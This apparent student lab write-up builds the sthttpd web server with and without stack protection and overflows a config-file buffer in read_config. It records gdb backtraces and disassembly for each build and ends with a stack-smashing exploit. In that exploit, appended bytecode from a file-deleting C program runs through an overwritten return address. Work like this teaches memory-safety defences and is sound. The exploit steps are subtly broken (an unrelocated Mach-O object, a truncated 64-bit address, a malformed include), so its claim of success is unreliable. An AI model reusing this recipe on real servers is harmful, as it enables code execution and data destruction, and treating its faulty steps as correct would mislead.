ServerSmasher

Solo Project by Rishabh Jain

Stand-alone program for running rogue code on a server without a canary protected stack.
Main vulnerability is in src/sthttpd.c, and obviously compilation flags.

Malicious code needs to be in the form of byte code. The pointer to this code also 
needs to be modified based on how large the malicious code is, hence it doesn’t make 
sense to include a compiled binary for execution.

However, it should be relatively easy to make the required modifications and compile 
the hacking application on your own computer.

PROCESS USED TO CREATE VULNERABLE SERVER PROGRAM:

vi src/sthttpd.c

Make sure stack protection is off.

I configure the software:

./configure \
   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

Finally, I compile the program using 3 different sets of commands:

make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
mv src/thttpd src/thttpd-sp
make clean

make CFLAGS=‘-g3 -O2 -fno-inline -fsanitize=address’
mv src/thttpd src/thttpd-as
make clean

make CFLAGS=‘-g3 -O2 -fno-inline -fno-stack-protector -zexecstack’
mv src/thttpd src/thttpd-no
make clean

Then I compute the ports to run the programs on:
12330 + 3 * (604917963 % 293) + 1 = 12706  (SP)
12330 + 3 * (604917963 % 293) + 2 = 12707  (AS)
12330 + 3 * (604917963 % 293) + 3 = 12708  (NO)

I create a file called foo.txt in the folder which contains src, 
with contents simply as “hello”.
(This is for testing of the servers).

echo "hello" > foo.txt

I start up the sp server by using the following command:

src/thttpd-sp -p 12706 -D

I then launch another ssh connection to the same linux server,
and test this tiny server by trying to retrieve my foo.txt file:

curl http://localhost:12706/foo.txt

I get the output:

hello

This means that our server is working properly.

I test the other servers out as well by using the commands:

src/thttpd-as -p 12707 -D
curl http://localhost:12707/foo.txt
src/thttpd-no -p 12708 -D
curl http://localhost:12708/foo.txt

I got hello outputted both times again, so all our softwares are
working properly.

***************ATTEMPT TO CRASH SERVERS******************

By reading the patch, I realized that I have to load a config file
with a line which has more than a 100 characters.

So I create another file called crasher.txt with a line with about
lots of words separated by spaces: (I used the word debug because 
the config func looks for keywords, and so random characters 
wouldn’t suffice)

debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug 

^Exact contents of the crasher.txt file

SP CRASHING

I then attempt to load this file as a config file in gdb:

gdb --args src/thttpd-sp -p 12706 -D -C crasher.txt

I get the following output:

(gdb) r
Starting program: /w/home.14/cs/ugrad/rishabhj/cs33/lab3/sthttpd-2.27.0/src/thttpd-sp -p 12706 -D -C crasher.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
*** stack smashing detected ***: /w/home.14/cs/ugrad/rishabhj/cs33/lab3/sthttpd-2.27.0/src/thttpd-sp terminated

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1

I then run a backtrace:

(gdb) bt
#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
#6  0x0000000000405056 in read_config (filename=<optimized out>)
    at thttpd.c:1190
#7  0x7562656400677562 in ?? ()
#8  0x0067756265640067 in ?? ()
#9  0x6564006775626564 in ?? ()
#10 0x7562656400677562 in ?? ()
#11 0x0067756265640067 in ?? ()
#12 0x6564006775626564 in ?? ()
#13 0x7562656400677562 in ?? ()
#14 0x0067756265640067 in ?? ()
#15 0x6564006775626564 in ?? ()
#16 0x7562656400677562 in ?? ()
#17 0x0067756265640067 in ?? ()
#18 0x6564006775626564 in ?? ()
#19 0x7562656400677562 in ?? ()
#20 0x0067756265640067 in ?? ()
#21 0x6564006775626564 in ?? ()
---Type <return> to continue, or q <return> to quit---
#22 0x7562656400677562 in ?? ()
#23 0x0067756265640067 in ?? ()
#24 0x6564006775626564 in ?? ()
#25 0x7562656400677562 in ?? ()
#26 0x0067756265640067 in ?? ()
#27 0x6564006775626564 in ?? ()
#28 0x7562656400677562 in ?? ()
#29 0x0067756265640067 in ?? ()
#30 0x6564006775626564 in ?? ()
#31 0x7562656400677562 in ?? ()
#32 0x0067756265640067 in ?? ()
#33 0x6564006775626564 in ?? ()
#34 0x7562656400677562 in ?? ()
#35 0x0067756265640067 in ?? ()
#36 0x6564006775626564 in ?? ()
#37 0x7562656400677562 in ?? ()
#38 0x0067756265640067 in ?? ()
#39 0x6564006775626564 in ?? ()
#40 0x7562656400677562 in ?? ()
#41 0x0067756265640067 in ?? ()
#42 0x6564006775626564 in ?? ()
#43 0x7562656400677562 in ?? ()
#44 0x0067756265640067 in ?? ()
---Type <return> to continue, or q <return> to quit---
#45 0x6564006775626564 in ?? ()
#46 0x7562656400677562 in ?? ()
#47 0x0067756265640067 in ?? ()
#48 0x6564006775626564 in ?? ()
#49 0x7562656400677562 in ?? ()
#50 0x0067756265640067 in ?? ()
#51 0x6564006775626564 in ?? ()
#52 0x7562656400677562 in ?? ()
#53 0x0000000000000067 in ?? ()
#54 0x0000000000000000 in ?? ()

I decide to set disassemble-next-line on so that I could see the assembly instructions, then set 
a breakpoint at read_config and step through the instructions using nexti. After going through the 
loop many times, the program crashes at the following instruction:

0x000000000040503d <read_config+1533>:       e8 6e d4 ff ff  callq  0x4024b0 <__stack_chk_fail@plt>

Right before the read_config function returns, there is an assembly 
instruction checking the stack for any unexpected changes. This is done
with the help of a canary, and since we smashed the stack by buffer 
overflow, the program detects this and crashes. The program works by
checking whether the value of the canary was changed, and if it was, 
it concludes that something dangerous has happened. 
This fact is confirmed by the backtrace, which shows _stack_chk_fail()
as the last function called before error handling.

AS CRASHING

I close out gdb and start it again using:

gdb --args src/thttpd-as -p 12707 -D -C crasher.txt

By running the program, I get the following error:

(gdb) r
Starting program: /w/home.14/cs/ugrad/rishabhj/cs33/lab3/sthttpd-2.27.0/src/thttpd-as -p 12707 -D -C crasher.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
=================================================================
==2070==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcd94 at pc 0x00000043aec9 bp 0x7fffffffccf0 sp 0x7fffffffc4a0
READ of size 524 at 0x7fffffffcd94 thread T0

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1



BACKTRACE:

(gdb) bt
#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
    this=0x7fffffffbc10, pc=4435657, max_depth=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
#3  0x00000000004b42e1 in GetStackTraceWithPcBpAndContext (fast=false, 
    context=0x0, bp=140737488342256, pc=4435657, max_depth=256, 
    stack=0x7fffffffbc10)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
#4  __asan::ReportGenericError (pc=<optimized out>, 
    bp=bp@entry=140737488342256, sp=sp@entry=140737488340128, 
    addr=addr@entry=140737488342420, is_write=is_write@entry=false, 
    access_size=access_size@entry=524, exp=<optimized out>, 
    fatal=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>, 
    c=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
#6  0x00000000004e0b51 in read_config (filename=<optimized out>)
    at thttpd.c:1018
#7  0x6564206775626564 in ?? ()
#8  0x7562656420677562 in ?? ()
---Type <return> to continue, or q <return> to quit---
#9  0x2067756265642067 in ?? ()
#10 0x6564206775626564 in ?? ()
#11 0x7562656420677562 in ?? ()
#12 0x2067756265642067 in ?? ()
#13 0x6564206775626564 in ?? ()
#14 0x7562656420677562 in ?? ()
#15 0x2067756265642067 in ?? ()
#16 0x6564206775626564 in ?? ()
#17 0x7562656420677562 in ?? ()
#18 0x2067756265642067 in ?? ()
#19 0x6564206775626564 in ?? ()
#20 0x7562656420677562 in ?? ()
#21 0x2067756265642067 in ?? ()
#22 0x6564206775626564 in ?? ()
#23 0x7562656420677562 in ?? ()
#24 0x2067756265642067 in ?? ()
#25 0x6564206775626564 in ?? ()
#26 0x7562656420677562 in ?? ()
#27 0x2067756265642067 in ?? ()
#28 0x6564206775626564 in ?? ()
#29 0x7562656420677562 in ?? ()
#30 0x2067756265642067 in ?? ()
#31 0x6564206775626564 in ?? ()
---Type <return> to continue, or q <return> to quit---
#32 0x7562656420677562 in ?? ()
#33 0x2067756265642067 in ?? ()
#34 0x6564206775626564 in ?? ()
#35 0x7562656420677562 in ?? ()
#36 0x2067756265642067 in ?? ()
#37 0x6564206775626564 in ?? ()
#38 0x7562656420677562 in ?? ()
#39 0x2067756265642067 in ?? ()
#40 0x6564206775626564 in ?? ()
#41 0x7562656420677562 in ?? ()
#42 0x2067756265642067 in ?? ()
#43 0x6564206775626564 in ?? ()
#44 0x7562656420677562 in ?? ()
#45 0x00000000000a2067 in ?? ()
#46 0x0000000000000000 in ?? ()

As before, I set a breakpoint at read_config, set 
disassemble-next-line on, and stepped through the instructions 
using nexti.

The program crashed here:

0x00000000004e0b4c	1018		if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
   0x00000000004e0b43 <read_config+179>:	48 8b 3c 24	mov    (%rsp),%rdi
   0x00000000004e0b47 <read_config+183>:	be 23 00 00 00	mov    $0x23,%esi
=> 0x00000000004e0b4c <read_config+188>:	e8 2f a5 f5 ff	callq  0x43b080 <__interceptor_strchr(char const*, int)>
   0x00000000004e0b51 <read_config+193>:	48 85 c0	test   %rax,%rax
   0x00000000004e0b54 <read_config+196>:	74 24	je     0x4e0b7a <read_config+234>
(gdb) 
=================================================================
==2651==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcd94 at pc 0x00000043aec9 bp 0x7fffffffccf0 sp 0x7fffffffc4a0
READ of size 524 at 0x7fffffffcd94 thread T0

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1


In this, the program crashed much earlier than the sp variant. 
This is because the checking was done frequently, rather 
than just once at the end. By calling _interceptor_strchr, the 
program checks if something was altered past the end of the buffer, 
and if it was, it crashes the program and gives control to error 
handling.

NO CRASHING

Again, I quit gdb, and then run it as follows:

gdb --args src/thttpd-no -p 12708 -D -C crasher.txt

(gdb) r
Starting program: /w/home.14/cs/ugrad/rishabhj/cs33/lab3/sthttpd-2.27.0/src/thttpd-no -p 12708 -D -C crasher.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
1190	    }

BACKTRACE:

(gdb) bt
#0  0x0000000000404d9f in read_config (filename=<optimized out>)
    at thttpd.c:1190
#1  0x7562656400677562 in ?? ()
#2  0x0067756265640067 in ?? ()
#3  0x6564006775626564 in ?? ()
#4  0x7562656400677562 in ?? ()
#5  0x0067756265640067 in ?? ()
#6  0x6564006775626564 in ?? ()
#7  0x7562656400677562 in ?? ()
#8  0x0067756265640067 in ?? ()
#9  0x6564006775626564 in ?? ()
#10 0x7562656400677562 in ?? ()
#11 0x0067756265640067 in ?? ()
#12 0x6564006775626564 in ?? ()
#13 0x7562656400677562 in ?? ()
#14 0x0067756265640067 in ?? ()
#15 0x6564006775626564 in ?? ()
#16 0x7562656400677562 in ?? ()
#17 0x0067756265640067 in ?? ()
#18 0x6564006775626564 in ?? ()
#19 0x7562656400677562 in ?? ()
#20 0x0067756265640067 in ?? ()
#21 0x6564006775626564 in ?? ()
---Type <return> to continue, or q <return> to quit---
#22 0x7562656400677562 in ?? ()
#23 0x0067756265640067 in ?? ()
#24 0x6564006775626564 in ?? ()
#25 0x7562656400677562 in ?? ()
#26 0x0067756265640067 in ?? ()
#27 0x6564006775626564 in ?? ()
#28 0x7562656400677562 in ?? ()
#29 0x0067756265640067 in ?? ()
#30 0x6564006775626564 in ?? ()
#31 0x7562656400677562 in ?? ()
#32 0x0067756265640067 in ?? ()
#33 0x6564006775626564 in ?? ()
#34 0x7562656400677562 in ?? ()
#35 0x0067756265640067 in ?? ()
#36 0x6564006775626564 in ?? ()
#37 0x7562656400677562 in ?? ()
#38 0x0067756265640067 in ?? ()
#39 0x6564006775626564 in ?? ()
#40 0x7562656400677562 in ?? ()
#41 0x0067756265640067 in ?? ()
#42 0x6564006775626564 in ?? ()
#43 0x7562656400677562 in ?? ()
#44 0x0067756265640067 in ?? ()
---Type <return> to continue, or q <return> to quit---
#45 0x6564006775626564 in ?? ()
#46 0x7562656400677562 in ?? ()
#47 0x0000000000000067 in ?? ()
#48 0x0000000000000000 in ?? ()

Again, for the final time, I set a breakpoint at read_config, 
set disassemble-next-line on, and run the program again, 
stepping through instructions with nexti.

OUTPUT:

   0x0000000000404d7f <read_config+1215>:       48 83 c4 70     add    $0x70,%rsp

   0x0000000000404d83 <read_config+1219>:       5b      pop    %rbx

   0x0000000000404d84 <read_config+1220>:       5d      pop    %rbp

   0x0000000000404d85 <read_config+1221>:       41 5c   pop    %r12

   0x0000000000404d87 <read_config+1223>:       41 5d   pop    %r13

   0x0000000000404d89 <read_config+1225>:       41 5e   pop    %r14

=> 0x0000000000404d8b <read_config+1227>:       c3      retq

(gdb)




Program received signal SIGSEGV, Segmentation fault.

0x0000000000404d8b in read_config (filename=<optimized out>) at thttpd.c:1190

1190        }

   0x0000000000404d7f <read_config+1215>:       48 83 c4 70     add    $0x70,%rsp

   0x0000000000404d83 <read_config+1219>:       5b      pop    %rbx

   0x0000000000404d84 <read_config+1220>:       5d      pop    %rbp

   0x0000000000404d85 <read_config+1221>:       41 5c   pop    %r12

   0x0000000000404d87 <read_config+1223>:       41 5d   pop    %r13

   0x0000000000404d89 <read_config+1225>:       41 5e   pop    %r14

=> 0x0000000000404d8b <read_config+1227>:       c3      retq

By looking at this, we see that no checking for stack smashing 
was done. When the buffer overflowed, the program continued as 
normal. This was expected, because no flags were given which 
warranted stack protection. The program crashes only when the 
return address was filled by nonsensical numbers, and hence the 
program was not sure where to give control. This is not guarenteed 
to happen always, and thus is very dangerous since some memory 
locations may be altered which we may never come to know of.

Then, I create the assembly language files using:

gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s

gcc -S -O2 -fno-inline -fsanitize=address -I .. -I . thttpd.c -o thttpd-as.s

gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s

THTTPD-SP.S

As discussed earlier, this form of stack protection uses a canary. 
By checking a certain value past the current stack frame, the 
program gets to know if something was altered which wasn’t supposed 
to be. When it detects that the value of the canary has changed, 
it crashes the program since something malicious could occur.


THTTPD-AS.S

In this version, it checks whether an illegal memory space is being 
accessed. This works by specifying certain locations as valid, 
and others as redzones, which shouldn’t be accessed. If it detects 
any of these special redzones being accessed, it crashes the program.
In this way, if the buffer ever overflows, the program will get to 
know since anything immediately past the stack frame would be a 
redzone. 

THTTPD-NO.S

This version simply doesn’t check for any buffer overflow problems. 
It’ll only cause a hiccup in normal usage if the return address 
is overwritten accidentally (or intentionally...)


EXPLOIT

I first create a file called target.txt with contents “Hello World”.

My basic approach will be to get the program to run code in my 
custom config file, which will attempt to delete the file. I need 
to change the instruction pointer to the location of my code. 
First, I simply create a file tester.txt with contents “PUT CODE HERE”.

Then I run gdb:

gdb --args src/thttpd-no -p 12708 -D -C tester.txt

I put a breakpoint at read_config, and run the program. I check the 
info of the stack frame at this point:

(gdb) break read_config
Breakpoint 1 at 0x4048e0: file thttpd.c, line 1000.
(gdb) r
Starting program: /w/home.14/cs/ugrad/rishabhj/cs33/lab3/sthttpd-2.27.0/src/thttpd-no -p 12708 -D -C tester.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Breakpoint 1, read_config (filename=0x7fffffffe4af "tester.txt")
    at thttpd.c:1000
1000	    {
(gdb) info frame
Stack level 0, frame at 0x7fffffffcf10:
 rip = 0x4048e0 in read_config (thttpd.c:1000); saved rip = 0x4051df
 called by frame at 0x7fffffffcf50
 source language c.
 Arglist at 0x7fffffffcf00, args: filename=0x7fffffffe4af "tester.txt"
 Locals at 0x7fffffffcf00, Previous frame's sp is 0x7fffffffcf10
 Saved registers:
  rip at 0x7fffffffcf08

As we can see, the instruction pointer is saved 
at 0x7fffffffcf08. I need to overflow till there and alter 
that to the location of the data of my tester.txt file.

Since tester.txt file is loaded into the line variable, I think 
I can get the location if I just do print &line:

(gdb) print &line
$1 = (char (*)[100]) 0x7fffffffce70

So I need to get the instruction pointer to point to this 
location.

watch *(int *) 0x7fffffffcf08

By computing 0x7fffffffcf08 − 0x7fffffffce70, I realize that the 
instruction pointer resides 152 bytes ahead of the place where 
my tester.txt file will be loaded into. So I need to put 152 
characters of random gibberish before the location of my code.

I add random 152 characters to tester.txt.

I test this out using:

(gdb) break read_config
Breakpoint 4 at 0x4048e0: file thttpd.c, line 1000.
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /w/home.14/cs/ugrad/rishabhj/cs33/lab3/sthttpd-2.27.0/src/thttpd-no -p 12708 -D -C tester.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Breakpoint 4, read_config (filename=0x7fffffffe4af "tester.txt")
    at thttpd.c:1000
1000	    {
(gdb) info frame
Stack level 0, frame at 0x7fffffffcf10:
 rip = 0x4048e0 in read_config (thttpd.c:1000); saved rip = 0x4051df
 called by frame at 0x7fffffffcf50
 source language c.
 Arglist at 0x7fffffffcf00, args: filename=0x7fffffffe4af "tester.txt"
 Locals at 0x7fffffffcf00, Previous frame's sp is 0x7fffffffcf10
 Saved registers:
  rip at 0x7fffffffcf08
(gdb) watch *(int *) 0x7fffffffcf08
Hardware watchpoint 5: *(int *) 0x7fffffffcf08
(gdb) break 1020
Breakpoint 6 at 0x40493d: file thttpd.c, line 1020.
(gdb) continue
Continuing.
Hardware watchpoint 5: *(int *) 0x7fffffffcf08

Old value = 4215263
New value = 1936946035
0x00007ffff766b9bc in __memcpy_sse2 () from /lib64/libc.so.6
(gdb) 

So, our file successfully overflowed into the instruction 
pointer location.

I then make a file called code.c which has the following code:
include <stdio.h>
#include <string.h>
int main ()
{
        char filename[] = “target.txt";
        remove(filename);
        return(0);
}
This code deletes the target.txt file when executed.

I then make the instruction pointer overwrite to exactly where our 
code will begin, which is 156 bytes after the start of tester.txt, 
because it takes 4 characters to specify location of the code, and 
the code will reside directly after the location of itself.

Since I need the location to be 156 bytes after the start of 
tester.txt, the hexadecimal location will be 0x7FFFFFFFCF0C. I 
use an online hexadecimal to ascii converter to get the required 
characters to overwrite the instruction pointer. I get the 
following output:ÿÿÿÏ

Hence, I append this to my tester.txt file. Now, when I run the 
program, the instruction pointer after returning read_config will 
point to the code right after the newly appended characters in 
my tester.txt file.

To successfully delete the target.txt file, I simply need to 
append the bytecode of code.c to tester.txt.

gcc -O2 -c code.c
objdump -d code.o


code.o:	file format Mach-O 64-bit x86-64

Disassembly of section __TEXT,__text:
_main:
       0:	55 	pushq	%rbp
       1:	48 89 e5 	movq	%rsp, %rbp
       4:	53 	pushq	%rbx
       5:	48 83 ec 18 	subq	$24, %rsp
       9:	48 8b 1d 00 00 00 00 	movq	(%rip), %rbx
      10:	48 8b 1b 	movq	(%rbx), %rbx
      13:	48 89 5d f0 	movq	%rbx, -16(%rbp)
      17:	48 b8 74 61 72 67 65 74 2e 74 	movabsq	$8371756736204398964, %rax
      21:	48 89 45 e0 	movq	%rax, -32(%rbp)
      25:	c6 45 ea 00 	movb	$0, -22(%rbp)
      29:	66 c7 45 e8 78 74 	movw	$29816, -24(%rbp)
      2f:	48 8d 7d e0 	leaq	-32(%rbp), %rdi
      33:	e8 00 00 00 00 	callq	0 <_main+38>
      38:	48 3b 5d f0 	cmpq	-16(%rbp), %rbx
      3c:	75 09 	jne	9 <_main+47>
      3e:	31 c0 	xorl	%eax, %eax
      40:	48 83 c4 18 	addq	$24, %rsp
      44:	5b 	popq	%rbx
      45:	5d 	popq	%rbp
      46:	c3 	retq
      47:	e8 00 00 00 00 	callq	0 <_main+4C>

Using the hex2raw program given on ccle, I convert the hexcode 
to bytecode.

I first copy the hexcode into the file hexcode.txt manually.

Then I do the following command:

./hex2raw < hexcode.txt > bytecode.txt

This bytecode is then appended to my exploit text file, tester.txt.

cat bytecode.txt >> tester.txt

I remove the extra newline character added due to the append operator.

I test out the exploit by:

src/sthttpd-no -p 12708 -D -C tester.txt

And sure enough, target.txt was deleted.
